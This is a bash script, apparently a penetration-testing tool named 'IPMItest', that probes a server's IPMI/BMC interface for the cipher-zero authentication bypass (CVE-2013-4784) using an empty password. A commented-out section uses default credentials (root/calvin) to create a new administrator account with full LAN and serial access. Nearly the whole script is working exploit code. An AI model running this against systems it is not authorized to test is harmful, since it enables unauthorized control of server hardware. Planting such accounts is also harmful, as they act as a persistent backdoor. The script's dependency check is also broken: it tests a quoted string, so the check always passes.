#!/bin/bash

HOST=$1
VERSION=0.2
IPMIVERSION=$(ipmitool -V)
DATE=$(date +%F_%R:%S)
DIRECTORY='ipmitool'
INTERFACE='lanplus'
USER='Administrator'
BMCUSER='root'
BMCPASS='calvin'
COMMAND='session info active'
COMMAND2='user list'
LOGFILE=ipmitool\_$HOST\_$DATE.log

echo "'####:'########::'##::::'##:'####:'########:'########::'######::'########:"
echo ". ##:: ##.... ##: ###::'###:. ##::... ##..:: ##.....::'##... ##:... ##..::"
echo ": ##:: ##:::: ##: ####'####:: ##::::: ##:::: ##::::::: ##:::..::::: ##::::"
echo ": ##:: ########:: ## ### ##:: ##::::: ##:::: ######:::. ######::::: ##::::"
echo ": ##:: ##.....::: ##. #: ##:: ##::::: ##:::: ##...:::::..... ##:::: ##::::"
echo ": ##:: ##:::::::: ##:.:: ##:: ##::::: ##:::: ##:::::::'##::: ##:::: ##::::"
echo "'####: ##:::::::: ##:::: ##:'####:::: ##:::: ########:. ######::::: ##::::"
echo "..:::::::::..:::::..::....:::::..:::::........:::......::::::..:::::"
echo "V.($VERSION) by Alexos Core Labs"
echo
# Test dependencies 
echo [*] Testing dependencies...
echo
if [ 'dpkg -l | grep -qw ipmitool' ]; then
 echo [*] $IPMIVERSION  installed...
 echo
else 
 echo [*] Installing dependencies...
 sudo aptitude install ipmitool freeipmi-tools
fi

#HELP
if [ $# -ne 1 ]; then
   echo Usage: $0 IP
   exit
fi

echo  [*] Analyzing IPMI on $HOST...

# Checking Log Directory Exist
if [ -d $DIRECTORY ]; then
 echo
else 
 echo [*] Creating Log Directory...
 echo
 mkdir ipmitool
fi

# Test Cipher Type Zero Authentication Bypass Vulnerability (CVE-2013-4784)
echo "[*] Testing for Zero Cipher(CVE-2013-4784)..."
ipmitool -I $INTERFACE -C 0 -H $HOST -U $USER -P "" $COMMAND > ipmitool/$LOGFILE
cd ipmitool
cat $LOGFILE | grep "ADMINISTRATOR"
cat $LOGFILE | grep "console ip"
echo

# Creating user with administrative rights
# Change the BMCUSER/BMCPASS variables and uncomment the lines below 

#echo [*] Add a User with Administrative Rights...
#echo "Section User9" > createuser.txt
#echo "Username testuser" >> createuser.txt
#echo "Password testuser" >> createuser.txt
#echo "Enable_User Yes" >> createuser.txt
#echo "Lan_Enable_IPMI_Msgs Yes" >> createuser.txt
#echo "Lan_Enable_Link_Auth Yes" >> createuser.txt
#echo "Lan_Enable_Restricted_to_Callback No" >> createuser.txt
#echo "Lan_Privilege_Limit Administrator" >> createuser.txt
#echo "SOL_Payload_Access Yes" >> createuser.txt 
#echo "Serial_Enable_IPMI_Msgs Yes" >>  createuser.txt
#echo "Serial_Enable_Link_Auth Yes" >> createuser.txt
#echo "Serial_Enable_Restricted_to_Callback No" >>  createuser.txt
#echo "Serial_Privilege_Limit Administrator" >> createuser.txt
#echo "EndSection" >> createuser.txt

#bmc-config -v -u $BMCUSER -p $BMCPASS -h $HOST --commit -f createuser.txt 

#ipmitool -I $INTERFACE -C 0 -H $HOST -U $USER -P "" $COMMAND2 > $LOGFILE 

#echo
#echo [*] Testing User...
#cat $LOGFILE | grep "testuser"
#echo

echo [*] done
